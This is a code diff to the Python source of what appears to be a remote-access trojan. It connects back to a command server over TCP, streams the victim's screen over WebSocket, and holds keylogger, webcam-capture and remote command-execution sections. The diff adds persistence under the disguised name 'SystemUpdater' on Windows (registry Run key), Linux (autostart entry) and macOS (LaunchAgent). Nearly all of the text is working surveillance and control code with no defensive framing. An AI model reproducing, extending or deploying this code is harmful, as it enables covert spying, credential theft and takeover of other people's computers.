@@ -15,9 +15,10 @@ import pyautogui
 import os
 import sys
 from datetime import datetime
-
-
-SERVER_HOST = "192.168.1.2"  # Change this
+import platform
+import logging
+# === CONFIG ===
+SERVER_HOST = "192.168.1.3"  # Update to your server IP
 TCP_PORT = 5555
 WS_PORT = 8765
 
@@ -32,14 +33,14 @@ def tcp_handler():
     global tcp_client, tcp_connected
     while True:
         try:
-            logging.info(" Connecting to TCP server...")
+            logging.info("🔁 Connecting to TCP server...")
             with tcp_lock:
                 tcp_client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 tcp_client.settimeout(10)
                 tcp_client.connect((SERVER_HOST, TCP_PORT))
                 tcp_client.settimeout(None)
                 tcp_connected = True
-            logging.info(" TCP Connected")
+            logging.info("✅ TCP Connected")
 
             while True:
                 data = tcp_client.recv(4096).decode()
@@ -78,37 +79,95 @@ async def ws_monitor():
     global ws_connection
     while True:
         await asyncio.sleep(5)
-        if ws_connection and ws_connection.closed:
-            logging.warning("[WS Monitor] WebSocket closed, restarting stream...")
-            await stream_screen()
+        try:
+            if ws_connection and ws_connection.close_code is not None:
+                logging.warning("[WS Monitor] WebSocket closed, restarting stream...")
+                await stream_screen()
+        except Exception as e:
+            logging.warning(f"[WS Monitor] Exception: {e}")
 
-# === Persistence ===
+
+
+
 def add_persistence():
     try:
         system = platform.system()
+        script_path = os.path.realpath(sys.argv[0])
+        python_path = sys.executable
+
         if system == "Windows":
             import winreg
-            exe_path = sys.executable
-            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
-                                 r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-            winreg.SetValueEx(key, "SystemUpdater", 0, winreg.REG_SZ, exe_path)
+            command = f'"{python_path}" "{script_path}"'
+            key = winreg.OpenKey(
+                winreg.HKEY_CURRENT_USER,
+                r"Software\Microsoft\Windows\CurrentVersion\Run",
+                0, winreg.KEY_SET_VALUE
+            )
+            winreg.SetValueEx(key, "SystemUpdater", 0, winreg.REG_SZ, command)
             winreg.CloseKey(key)
+            logging.info("[+] Persistence added to Windows registry")
+
         elif system == "Linux":
-            path = os.path.expanduser("~/.config/autostart")
-            os.makedirs(path, exist_ok=True)
-            file_path = os.path.join(path, "sysupdater.desktop")
-            with open(file_path, "w") as f:
-                f.write(f"""[Desktop Entry]
+            autostart_path = os.path.expanduser("~/.config/autostart")
+            os.makedirs(autostart_path, exist_ok=True)
+            desktop_entry = f"""[Desktop Entry]
 Type=Application
-Exec=python3 {os.path.abspath(sys.argv[0])}
+Exec={python_path} "{script_path}"
 Hidden=false
 NoDisplay=false
 X-GNOME-Autostart-enabled=true
 Name=SystemUpdater
-""")
-        logging.info("[+] Persistence added")
+"""
+            with open(os.path.join(autostart_path, "systemupdater.desktop"), "w") as f:
+                f.write(desktop_entry)
+            logging.info("[+] Persistence added to Linux autostart")
+
+        elif system == "Darwin":  # macOS
+            plist_path = os.path.expanduser("~/Library/LaunchAgents/com.system.updater.plist")
+            os.makedirs(os.path.dirname(plist_path), exist_ok=True)
+            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" 
+"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.system.updater</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>{python_path}</string>
+        <string>{script_path}</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+</dict>
+</plist>
+"""
+            with open(plist_path, "w") as f:
+                f.write(plist_content)
+            logging.info("[+] Persistence added to macOS LaunchAgents")
+
+        else:
+            logging.warning("[!] Unsupported OS for persistence")
+
     except Exception as e:
         logging.error(f"[!] Persistence Error: {e}")
+
+
+def remove_persistence():
+    try:
+        if platform.system() == "Windows":
+            import winreg
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                                 r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)
+            winreg.DeleteValue(key, "SystemUpdater")
+            winreg.CloseKey(key)
+        elif platform.system() == "Linux":
+            path = os.path.expanduser("~/.config/autostart/sysupdater.desktop")
+            if os.path.exists(path):
+                os.remove(path)
+        tcp_client.send(b"PERSISTENCE REMOVED\n")
+    except Exception as e:
+        tcp_client.send(f"REMOVE ERROR: {e}".encode())
 
 # === Keylogger ===
 key_buffer = ""
@@ -190,22 +249,6 @@ def execute_command(command):
     except Exception as e:
         tcp_client.send(f"CMD ERROR: {e}".encode())
 
-def remove_persistence():
-    try:
-        if platform.system() == "Windows":
-            import winreg
-            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
-                                 r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-            winreg.DeleteValue(key, "SystemUpdater")
-            winreg.CloseKey(key)
-        elif platform.system() == "Linux":
-            path = os.path.expanduser("~/.config/autostart/sysupdater.desktop")
-            if os.path.exists(path):
-                os.remove(path)
-        tcp_client.send(b"PERSISTENCE REMOVED\n")
-    except Exception as e:
-        tcp_client.send(f"REMOVE ERROR: {e}".encode())
-
 # === Webcam ===
 def send_webcam_image():
     try:
@@ -226,7 +269,7 @@ async def stream_screen():
         try:
             uri = f"ws://{SERVER_HOST}:{WS_PORT}"
             ws_connection = await websockets.connect(uri, ping_interval=None, max_size=None)
-            logging.info(" WebSocket connected")
+            logging.info("📡 WebSocket connected")
 
             with mss.mss() as sct:
                 monitor = sct.monitors[1]
@@ -237,7 +280,7 @@ async def stream_screen():
                     _, jpeg = cv2.imencode('.jpg', resized, [int(cv2.IMWRITE_JPEG_QUALITY), 80])
                     b64 = base64.b64encode(jpeg).decode()
                     await ws_connection.send(b64)
-                    await asyncio.sleep(0.15)  # 7 FPS
+                    await asyncio.sleep(0.15)  # ~7 FPS
         except Exception as e:
             logging.warning(f"[WS Reconnect] {e}")
             ws_connection = None
